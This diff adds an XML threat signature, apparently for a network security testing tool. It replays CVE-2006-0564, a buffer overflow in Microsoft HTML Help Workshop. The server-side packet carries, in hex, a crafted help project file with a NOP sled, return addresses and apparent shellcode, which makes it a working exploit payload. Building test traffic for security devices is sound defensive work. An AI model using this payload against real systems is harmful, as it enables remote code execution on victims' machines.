@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Help Workshop Buffer Overflow"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in the HTML Help Workshop application.  This occurs when processing a http file.  This attack is represented by a malicious download from a webserver, which typically occurs over port 80.  This is a client side attack sent from the virtual server."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_HTML_Help_Workshop"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_HTML_Help_Workshop_4.74.8702.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://users.pandora.be/bratax/advisories/b008.html"/>
+    <CVEID display="true" value="CVE-2006-0564"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="22941"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="00000109525c0d7b00c000a80001003c31ea15ab" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="local"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632750043613896250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1139548098" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2030382046656220323030362031383A34343A313720474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A205765642C2030382046656220323030362031383A34333A343020474D540D0A455461673A20223164653566632D3332302D6466653161663030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203830300D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D5554462D380D0A0D0A5B4F5054494F4E535D0A436F6D7061746962696C6974793D312E31206F72206C617465720A436F6D70696C65642066696C653D6272617461782E63686D0A436F6E74656E74732066696C653D90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090905D38827C5D38827C5D38827C5D38827C5D38827C5D38827C9090909029C983E9AFD9EED97424F45B8173138F35378583EBFCE2F4735FDCCA67CCC87A7055BCE9AB11BCC0B3BE4B80F734D80EC02DBCDAAF34DC66BF7CBCB10434D9B44FAC9B014F4130444538364764C10CD1AB1D4266046A13846453BC89C4BE68998EDE34A904BC5BA19354F4B44F51BCC5BFBE778904452B2804753FDBE7BB798B6365C853BEEE51D6E95D04B7E74244B7D061C855E7FEDA79B465C853D0BCD2E30ED83F87DA5F357A5F5DEE8C7A98607A596664D6DC6674D6CC66C855E95D028EE966BE641A5D939FFFF2607A595F27D4DACAE7ED2B98196CD8CAE1D6DACAE7ED6A7CB1CCD8CAE1D5DB61627A5FA65F62F6F34ED270E3627A5F535DE1E95D54E806D05DD5D61CFB0C685F730C6D04F77625CB75A871771B16024F0F2E249E5FF77186217AFA71C853D46265D4DE645D84DE6462D470E55F285630F9D670E35D7A7002C8550462CB064B51C853DDCAE7EDF1EDD5F6DCCAE17A5F353785222F3E0A446973706C617920636F6D70696C652070726F67726573733D4E6F0A4C616E67756167653D3078383133204475746368202842656C6769756D290A0A0A5B494E464F54595045535D" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
